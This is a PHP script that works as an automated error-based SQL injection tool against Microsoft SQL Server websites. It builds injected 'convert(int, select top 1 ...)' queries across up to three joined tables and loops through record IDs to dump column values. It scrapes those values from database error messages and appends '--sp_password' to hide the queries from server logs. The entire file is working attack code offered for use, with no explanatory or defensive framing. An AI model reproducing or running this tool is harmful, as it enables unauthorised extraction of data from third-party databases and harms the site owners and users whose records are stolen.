<?php
ini_set ("max_execution_time","360000");

function convert($chuoi)
{
	$temp="char(";
	for ($i=0;$i<strlen($chuoi)-1;$i++)
	{
		$temp.=ord($chuoi[$i]).")%2bchar(";
	}
	$temp.=ord($chuoi[strlen($chuoi)-1]).")";
	return $temp;
}

class CURL 
{
	var $callback = false;

	function setCallback($func_name) 
	{
		$this->callback = $func_name;
	}

	function doRequest($method, $url, $vars) 
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		if ($method == 'POST') 
		{
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
		}
		$data = curl_exec($ch);
		curl_close($ch);
		if ($data) 
		{
			if ($this->callback)
			{
				$callback = $this->callback;
				$this->callback = false;
				return call_user_func($callback, $data);
			} 
			else 
			{
			return $data;
			}
		} 
		else
		{
		return curl_error($ch);
		}
	}

	function get($url) 
	{
		return $this->doRequest('GET', $url, 'NULL');
	}

	function post($url, $vars) 
	{
		return $this->doRequest('POST', $url, $vars);
	}
}

$cc = new CURL();
echo "<pre>";

$url=$_POST["link"];

$table_value1=$_POST["table_value1"];
$table_value2=$_POST["table_value2"];
$table_value3=$_POST["table_value3"];

$column_value=$_POST["column_values12"];

$column_value1=$_POST["column_value1"];
$column_value2=$_POST["column_value2"];
$column_value3=$_POST["column_value3"];
$column_value4=$_POST["column_value4"];

$quantity=$_POST["quantity12"];
$last_id=$_POST["last_id12"];


$field_values1=$_POST["field_values1"];
$field_value1=explode("\n", $field_values1);

if  ($table_value3!=null)
{

$i=0;
while ($field_value1[$i]!='')
{
	  $i++;
        $field_value1[$i]=trim($field_value1[$i]);
	
}
$field_value1[0]=trim($field_value1[0]);

$url.="%20and%201=convert(int,(select%20top%201%20";
for ($j=0;$j<$i;$j++)
{
	$url.="%2bchar(32)%2bchar(124)%2bchar(32)%2bconvert(varchar,isnull(convert(varchar,A.".$field_value1[$j]."),char(32)))";
}

$field_values2=$_POST["field_values2"];
$field_value2=explode("\n", $field_values2);
$l=0;
while ($field_value2[$l]!='')
{
        $l++;
        $field_value2[$l]=trim($field_value2[$l]);
	
}
$field_value2[0]=trim($field_value2[0]);
for ($g=0;$g<$l;$g++)
{
	$url.="%2bchar(32)%2bchar(124)%2bchar(32)%2bconvert(varchar,isnull(convert(varchar,B.".$field_value2[$g]."),char(32)))";
}

$field_values3=$_POST["field_values3"];
$field_value3=explode("\n", $field_values3);
$m=0;
while ($field_value3[$m]!='')
{
        $m++;
        $field_value3[$m]=trim($field_value3[$m]);
	
}
$field_value3[0]=trim($field_value3[0]);
for ($n=0;$n<$m;$n++)
{
	$url.="%2bchar(32)%2bchar(124)%2bchar(32)%2bconvert(varchar,isnull(convert(varchar,C.".$field_value3[$n]."),char(32)))";
}


$url.="%20from%20".$table_value1."%20A".",".$table_value2."%20B".",".$table_value3."%20C";

$k=0;
while ($k<$quantity)
{
	$track=$last_id-$k;
	$k++;
	
	$url_o=$url."%20where%20A.".$column_value1."=B.".$column_value2."%20and%20B.".$column_value4."=C.".$column_value3."%20and%20A.".$column_value."=".$track."%20order%20by%20A.".$column_value."%20desc))--sp_password";
	$dat = $cc->get("$url_o");
	@eregi ("value '(.*)' to",$dat,$out);
	echo "$out[1]\n";
}
echo "Link Get : ";

echo $url_o;

}

else
{
$i=0;
while ($field_value1[$i]!='')
{
	$i++;
        $field_value1[$i]=trim($field_value1[$i]);
	
}
$field_value1[0]=trim($field_value1[0]);

$url.="%20and%201=convert(int,(select%20top%201%20";
for ($j=0;$j<$i;$j++)
{
	$url.="%2bchar(32)%2bchar(124)%2bchar(32)%2bconvert(varchar,isnull(convert(varchar,A.".$field_value1[$j]."),char(32)))";
}


$field_values2=$_POST["field_values2"];
$field_value2=explode("\n", $field_values2);
$l=0;
while ($field_value2[$l]!='')
{
        $l++;
        $field_value2[$l]=trim($field_value2[$l]);
	
}
$field_value2[0]=trim($field_value2[0]);
for ($g=0;$g<$l;$g++)
{
	$url.="%2bchar(32)%2bchar(124)%2bchar(32)%2bconvert(varchar,isnull(convert(varchar,B.".$field_value2[$g]."),char(32)))";
}

$url.="%20from%20".$table_value1."%20A".",".$table_value2."%20B";

$k=0;
while ($k<$quantity)
{
	$track=$last_id-$k;
	$k++;
	
	$url_o=$url."%20where%20A.".$column_value1."=B.".$column_value2."%20and%20A.".$column_value."=".$track."%20order%20by%20A.".$column_value."%20desc))--sp_password";
	$dat = $cc->get("$url_o");
	@eregi ("value '(.*)' to",$dat,$out);
	echo "$out[1]\n";
}
echo "Link Get: ";

echo $url_o;

}

?>